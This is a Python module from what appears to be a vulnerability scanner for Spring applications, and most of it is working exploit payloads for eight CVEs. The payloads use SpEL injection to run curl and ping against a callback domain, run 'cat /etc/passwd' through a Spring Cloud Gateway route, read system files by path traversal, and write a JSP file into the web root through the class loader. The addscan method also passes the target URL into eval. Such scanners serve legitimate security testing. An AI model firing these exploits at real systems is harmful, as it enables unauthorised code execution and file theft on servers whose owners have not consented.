#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
    Spring扫描类: 
        1. Spring Framework RCE(Spring core RCE)
            CVE-2022-22965
            Payload: https://vulhub.org/#/environments/spring/CVE-2022-22965/

        2. Spring Boot Actuator Log View 文件读取/文件包含/目录遍历
            CVE-2021-21234
                Payload: https://bbs.zkaq.cn/t/5736.html

        3. Spring Cloud Config Server目录遍历
            CVE-2020-5410
                Payload: https://bbs.zkaq.cn/t/5736.html

        4. Spring Cloud Function SpEL 远程代码执行
            CVE-2022-22963
                Payload: https://vulhub.org/#/environments/spring/CVE-2022-22963/
        
        5. Spring Cloud Gateway SpEl 远程代码执行
            CVE-2022-22947
                Payload: https://vulhub.org/#/environments/spring/CVE-2022-22947/

        6. Spring Security OAuth2 远程命令执行
            CVE-2016-4977
                Payload: https://vulhub.org/#/environments/spring/CVE-2016-4977/

        7. Spring Data Rest 远程命令执行
            CVE-2017-8046
                Payload: https://vulhub.org/#/environments/spring/CVE-2017-8046/

        8. Spring Data Commons 远程命令执行
            CVE-2018-1273
                Payload: https://vulhub.org/#/environments/spring/CVE-2018-1273/

file:///etc/passwd
file:///C:\Windows\System32\drivers\etc\hosts
'''

from lib.api.dns import dns
from lib.initial.config import config
from lib.tool.md5 import md5, random_md5, random_int_1, random_int_2
from lib.tool.logger import logger
from lib.tool.thread import thread
from lib.tool import check
from lib.tool import head
from thirdparty import requests
# from thirdparty import HackRequests
from time import sleep

class Spring():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')
        self.proxy = config.get('proxy')

        self.app_name = 'Spring'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.cve_2022_22965_payloads = [
            {
                'path': '?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20out.println(%22<h1>{}</h1>%22)%3B%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=mouse&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat='.format('CVE/2022/22965'),
                'data': ''
            },
            {
                'path': '',
                'data': 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20out.println(%22<h1>{}</h1>%22)%3B%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=mouse&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat='.format('CVE/2022/22965')
            }
        ]

        self.cve_2021_21234_payloads = [
            {
                'path': 'manage/log/view?filename=/etc/passwd&base=../../../../../../../',
                'data': ''
            },
            {
                'path': 'manage/log/view?filename=C:/Windows/System32/drivers/etc/hosts&base=../../../../../../../',
                'data': ''
            },
            {
                'path': 'manage/log/view?filename=C:\Windows\System32\drivers\etc\hosts&base=../../../../../../../',
                'data': ''
            }
        ]

        self.cve_2020_5410_payloads = [
            {
                'path': '..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/development"',
                'data': ''
            },
            {
                'path': '..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252FC:/Windows/System32/drivers/etc/hosts%23foo/development"',
                'data': ''
            },
            {
                'path': '..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252FC:\Windows\System32\drivers\etc\hosts%23foo/development"',
                'data': ''
            }
        ]

        self.cve_2022_22963_payloads = [
            {
                'path': 'functionRouter',
                'data': 'mouse',
                'headers': head.merge(self.headers, {
                    'spring.cloud.function.routing-expression': 'T(java.lang.Runtime).getRuntime().exec("curl dnsdomain")',
                    'Content-Type': 'text/plain'
                })
            },
            {
                'path': 'functionRouter',
                'data': 'mouse',
                'headers': head.merge(self.headers, {
                    'spring.cloud.function.routing-expression': 'T(java.lang.Runtime).getRuntime().exec("ping -c 4 dnsdomain")',
                    'Content-Type': 'text/plain'
                })
            },
            {
                'path': 'functionRouter',
                'data': 'mouse',
                'headers': head.merge(self.headers, {
                    'spring.cloud.function.routing-expression': 'T(java.lang.Runtime).getRuntime().exec("ping dnsdomain")',
                    'Content-Type': 'text/plain'
                })
            }
        ]

        self.cve_2022_22947_payloads = [
            {
                'path': 'gateway/routes/mouse',
                'data': '''{
  "id": "mouse",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\\"cat\\\",\\\"/etc/passwd\\\"}).getInputStream()))}"
    }
  }],
  "uri": "http://example.com"
}''',
                'headers': head.merge(self.headers, {'Content-Type': 'application/json'})
            },
            {
                'path': 'gateway/refresh',
                'data': '',
                'headers': head.merge(self.headers, {'Content-Type': 'application/json'})
            },
            {
                'path': 'gateway/routes/mouse',
                'data': '',
                'headers': head.merge(self.headers, {'Content-Type': 'application/json'})
            },
            {   # * 路径不同
                'path': 'actuator/gateway/routes/mouse',
                'data': '''{
  "id": "mouse",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\\"cat\\\",\\\"/etc/passwd\\\"}).getInputStream()))}"
    }
  }],
  "uri": "http://example.com"
}''',
                'headers': head.merge(self.headers, {'Content-Type': 'application/json'})
            },
            {
                'path': 'actuator/gateway/refresh',
                'data': '',
                'headers': head.merge(self.headers, {'Content-Type': 'application/json'})
            },
            {
                'path': 'actuator/gateway/routes/mouse',
                'data': '',
                'headers': head.merge(self.headers, {'Content-Type': 'application/json'})
            }
        ]

        self.cve_2016_4977_payloads = [
            {
                'path': 'oauth/authorize?response_type={}&client_id=acme&scope=openid&redirect_uri=http://test',
                'data': ''
            }
        ]

        self.cve_2017_8046_payloads = [
            {   # * curl
                'path': '1',
                'data': '[{ "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{99,117,114,108,32,DNSDOMAIN}))/lastname", "value": "vulhub" }]'
            },
            {   # * ping -c 4
                'path': '1',
                'data': '[{ "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{112,105,110,103,32,45,99,32,52,32,DNSDOMAIN}))/lastname", "value": "vulhub" }]'
            },
            {   # * ping
                'path': '1',
                'data': '[{ "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{112,105,110,103,32,DNSDOMAIN}))/lastname", "value": "vulhub" }]'
            },
        ]

        self.cve_2018_1273_payloads = [
            {
                'path': 'users?page=&size=5',
                'data': 'username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("curl DNSDOMAIN")]=&password=&repeatedPassword='
            },
            {
                'path': 'users?page=&size=5',
                'data': 'username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("ping -c 4 DNSDOMAIN")]=&password=&repeatedPassword='
            },
            {
                'path': 'users?page=&size=5',
                'data': 'username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("ping DNSDOMAIN")]=&password=&repeatedPassword='
            }
        ]

    def cve_2022_22965_scan(self, url):
        ''' Spring Framework 远程代码执行漏洞(Spring core RCE)
        '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'RCE'
        vul_info['vul_id'] = 'CVE-2022-22965'
        vul_info['vul_method'] = 'GET/POST'
        vul_info['headers'] = {
            'suffix': '%>//',
            'c1': 'Runtime',
            'c2': '<%',
            'DNT': '1'
        }

        headers = self.headers.copy()
        headers.update(vul_info['headers'])

        for payload in self.cve_2022_22965_payloads:    # * Payload
            path = payload['path']                      # * Path
            data = payload['data']                      # * Data
            target = url + path                         # * Target

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                if data:
                    res = requests.post(
                        target, 
                        timeout=self.timeout, 
                        headers=headers, 
                        data=data, 
                        proxies=self.proxies, 
                        verify=False
                    )
                else:
                    res = requests.get(
                        target, 
                        timeout=self.timeout, 
                        headers=headers, 
                        data=data, 
                        proxies=self.proxies, 
                        verify=False
                    )
                logger.logging(vul_info, res.status_code, res)                        # * LOG

                verify_url = url + 'mouse.jsp'
                for i in range(3):
                    sleep(2.5)                                # * 延时, 因为命令执行的回显可能有延迟, 要等一会判断结果才准确
                    verify_res = requests.get(
                        verify_url, 
                        timeout=self.timeout, 
                        headers=self.headers,
                        proxies=self.proxies, 
                        verify=False,
                        allow_redirects=False
                    )
                    logger.logging(vul_info, verify_res.status_code, verify_res)
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            if ((verify_res.status_code == 200) and ('CVE/2022/22965' in verify_res.text)):
                results = {
                    'Target': verify_url,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Payload': res
                }
                return results

    def cve_2021_21234_scan(self, url):
        ''' spring-boot-actuator-logview文件包含漏洞
                <= 0.2.13
                虽然检查了文件名参数以防止目录遍历攻击(filename=../somefile 防御了攻击)
                但没有充分检查基本文件夹参数, 因此filename=somefile&base=../ 可以访问日志记录基目录之外的文件
        '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'FileRead'
        vul_info['vul_id'] = 'CVE-2021-21234'
        vul_info['vul_method'] = 'GET'
        vul_info['headers'] = {}

        headers = self.headers
        headers.update(vul_info['headers'])             # * 合并Headers

        for payload in self.cve_2021_21234_payloads:    # * Payload
            path = payload['path']                      # * Path
            data = payload['data']                      # * Data
            target = url + path                         # * Target

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.get(
                    target, 
                    timeout=self.timeout, 
                    headers=headers, 
                    data=data, 
                    proxies=self.proxies, 
                    verify=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            if (('/sbin/nologin' in res.text) 
                or ('root:x:0:0:root' in res.text) 
                or ('Microsoft Corp' in res.text) 
                or ('Microsoft TCP/IP for Windows' in res.text)
            ):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': {
                        'Url': url,
                        'Path': path
                    }
                }
                return results

    def cve_2020_5410_scan(self, url):
        ''' spring cloud config server目录遍历漏洞
                可以使用特制URL发送请求, 从而跨目录读取文件。
        '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'FileRead'
        vul_info['vul_id'] = 'CVE-2020-5410'
        vul_info['vul_method'] = 'GET'
        vul_info['headers'] = {}

        headers = self.headers
        headers.update(vul_info['headers'])             # * 合并Headers

        for payload in self.cve_2020_5410_payloads:     # * Payload
            path = payload['path']                      # * Path
            data = payload['data']                      # * Data
            target = url + path                         # * Target

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.get(
                    target, 
                    timeout=self.timeout, 
                    headers=headers, 
                    data=data, 
                    proxies=self.proxies, 
                    verify=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            if (('/sbin/nologin' in res.text) 
                or ('root:x:0:0:root' in res.text) 
                or ('Microsoft Corp' in res.text) 
                or ('Microsoft TCP/IP for Windows' in res.text)
            ):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': {
                        'Url': url,
                        'Path': path
                    }
                }
                return results

    def cve_2022_22963_scan(self, url):
        ''' Spring Cloud Function中RoutingFunction类的apply方法
                将请求头中的spring.cloud.function.routing-expression参数作为Spel表达式进行处理; 
                造成了Spel表达式注入漏洞, 当使用路由功能时, 攻击者可利用该漏洞远程执行任意代码
        '''
        sessid = 'ff864206449349277d8c5b0df7897d4b'
        md = random_md5()                                       # * 随机md5值, 8位
        dns_domain = md + '.' + dns.domain(sessid)              # * dnslog/ceye域名

        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'RCE'
        vul_info['vul_id'] = 'CVE-2022-22963'
        vul_info['vul_method'] = 'POST'

        for payload in self.cve_2022_22963_payloads:
            path = payload['path']
            data = payload['data']
            headers = payload['headers']
            target = url + path
            # * 在payload里面添加dnslog域名
            headers['spring.cloud.function.routing-expression'] = headers['spring.cloud.function.routing-expression'].replace('dnsdomain', dns_domain)

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['headers'] = headers
            vul_info['target'] = target

            try:
                res = requests.post(
                    target, 
                    timeout=self.timeout, 
                    headers=headers,
                    data=data, 
                    proxies=self.proxies, 
                    verify=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            sleep(2)                                                # * dns查询可能较慢, 等一会
            if (md in dns.result(md, sessid)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Payload': res
                }
                return results

    def cve_2022_22947_scan(self, url):
        ''' 在 3.1.0 和 3.0.6 之前的版本中使用 Spring Cloud Gateway 的应用程序
                在启用、暴露和不安全的 Gateway Actuator 端点时容易受到代码注入攻击
                远程攻击者可以发出制作的恶意请求, 在远程主机上进行远程执行任意代码
        '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'RCE'
        vul_info['vul_id'] = 'CVE-2022-22947'
        vul_info['vul_method'] = 'POST'

        for payload in range(len(self.cve_2022_22947_payloads)):
            path = self.cve_2022_22947_payloads[payload]['path']
            data = self.cve_2022_22947_payloads[payload]['data']
            headers = self.cve_2022_22947_payloads[payload]['headers']
            target = url + path

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['headers'] = headers
            vul_info['target'] = target

            try:
                if ((payload + 1) % 3 == 0):        # * 判断路由是否创建成功
                    res = requests.get(
                    target, 
                    timeout=self.timeout, 
                    headers=headers,
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )
                else:
                    res = requests.post(
                        target, 
                        timeout=self.timeout, 
                        headers=headers,
                        data=data, 
                        proxies=self.proxies, 
                        verify=False,
                        allow_redirects=False
                    )
                logger.logging(vul_info, res.status_code, res)                        # * LOG

                if ((res.status_code == 200) 
                    and (('/sbin/nologin' in res.text) 
                        or ('root:x:0:0:root' in res.text))):
                    results = {
                        'Target': target,
                        'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                        'Headers': headers,
                        'Payload-1': {
                            'Method': 'POST',
                            'Url': url,
                            'Path': self.cve_2022_22947_payloads[payload-2]['path'],
                            'Data': self.cve_2022_22947_payloads[payload-2]['data']
                        },
                        'Payload-2': {
                            'Method': 'POST',
                            'Url': url,
                            'Path': self.cve_2022_22947_payloads[payload-1]['path'],
                            'Data': self.cve_2022_22947_payloads[payload-1]['data']
                        },
                        'Payload-3': {
                            'Method': 'GET',
                            'Url': url,
                            'Path': path,
                            'Data': data
                        }
                    }
                    return results

            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

    def cve_2016_4977_scan(self, url):
        ''' Spring Security OAuth是为Spring框架提供安全认证支持的一个模块;
            在其使用whitelabel views来处理错误时, 由于使用了Springs Expression Language (SpEL), 
                攻击者在被授权的情况下可以通过构造恶意参数来远程执行命令
        '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'RCE'
        vul_info['vul_id'] = 'CVE-2016-4977'
        vul_info['vul_method'] = 'GET'
        vul_info['headers'] = {}

        # headers = self.headers.copy()
        # headers.update(vul_info['headers'])

        random_num_1, random_num_2 = random_int_2()

        for payload in self.cve_2016_4977_payloads:
            path = payload['path'].format('${' + str(random_num_1) + '*' + str(random_num_2) + '}')
            data = payload['data']
            target = url + path

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.get(
                    target, 
                    timeout=self.timeout, 
                    headers=self.headers,
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            if (str(random_num_1 * random_num_2) in res.text):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results

    def cve_2017_8046_scan(self, url):
        ''' 构造ASCII码的JSON数据包, 向spring-data-rest服务器提交恶意PATCH请求, 可以执行任意代码 '''
        sessid = '8d2aba535b132733b453254c40e50f95'
        
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'RCE'
        vul_info['vul_id'] = 'CVE-2017-8046'
        # vul_info['vul_method'] = 'PATCH'
        vul_info['headers'] = {
            'Content-Type': 'application/json-patch+json'
        }

        headers = self.headers.copy()
        headers.update(vul_info['headers'])

        # * 先使用POST请求添加一个对象, 防止目标不存在对象 导致漏洞利用失败
        res0 = requests.post(
            url, 
            timeout=self.timeout, 
            headers={'Content-Type': 'application/json'},
            data='{}', 
            proxies=self.proxies, 
            verify=False,
            allow_redirects=False
        )
        logger.logging(vul_info, res0.status_code, res0)

        for payload in self.cve_2017_8046_payloads:
            md = random_md5()                                       # * 随机md5值, 8位
            dns_domain = md + '.' + dns.domain(sessid)              # * dnslog/ceye域名
            
            # ! 该漏洞的Payload需要转换成ASCII码, 以逗号分隔每一个字母的ASCII编码
            ascii_dns_domain = ''
            for b in dns_domain:
                ascii_dns_domain += str(ord(b)) + ','

            if url[-1] != '/':
                url += '/'
            path = payload['path']
            data = payload['data'].replace('DNSDOMAIN', ascii_dns_domain[:-1])
            target = url + path

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.patch(
                    target, 
                    timeout=self.timeout, 
                    headers=headers,
                    data=data, 
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            sleep(3)
            if (md in dns.result(md, sessid)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res,
                    'Encodeing': 'ASCII'
                }
                return results

    def cve_2018_1273_scan(self, url):
        ''' Spring Data是一个用于简化数据库访问, 并支持云服务的开源框架;
            Spring Data Commons是Spring Data下所有子项目共享的基础框架;
            Spring Data Commons 在2.0.5及以前版本中, 存在一处SpEL表达式注入漏洞, 
                攻击者可以注入恶意SpEL表达式以执行任意命令
        '''
        sessid = 'f638f51cbd7085fc19b791bb689ad7d7'
        
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'RCE'
        vul_info['vul_id'] = 'CVE-2018-1273'
        # vul_info['vul_method'] = 'POST'
        vul_info['headers'] = {}

        headers = self.headers.copy()
        headers.update(vul_info['headers'])

        for payload in self.cve_2018_1273_payloads:
            md = random_md5()                                       # * 随机md5值, 8位
            dns_domain = md + '.' + dns.domain(sessid)              # * dnslog/ceye域名

            path = payload['path']
            data = payload['data'].replace('DNSDOMAIN', dns_domain)
            target = url + path

            headers['Referer'] = target

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.post(
                    target, 
                    timeout=self.timeout, 
                    headers=headers,
                    data=data, 
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            sleep(3)
            if (md in dns.result(md, sessid)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results

    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cve_2020_5410_scan, url=url),
            thread(target=self.cve_2021_21234_scan, url=url),
            thread(target=self.cve_2022_22965_scan, url=url),
            thread(target=self.cve_2022_22963_scan, url=url),
            thread(target=self.cve_2022_22947_scan, url=url),
            thread(target=self.cve_2016_4977_scan, url=url),
            thread(target=self.cve_2017_8046_scan, url=url),
            thread(target=self.cve_2018_1273_scan, url=url)
        ]

spring = Spring()